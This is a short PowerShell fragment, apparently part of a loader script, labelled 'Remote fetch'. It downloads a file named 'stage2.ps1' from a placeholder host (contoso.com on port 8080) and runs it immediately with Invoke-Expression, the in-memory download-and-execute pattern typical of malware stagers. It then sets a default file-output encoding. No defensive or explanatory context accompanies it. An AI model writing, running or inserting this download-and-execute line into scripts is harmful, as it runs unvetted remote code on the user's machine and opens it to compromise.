
<# Remote fetch #> $TransferUrl = "http://contoso.com:8080/stage2.ps1"; IEX (Invoke-WebRequest -Uri $TransferUrl -UseBasicParsing).Content; $PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
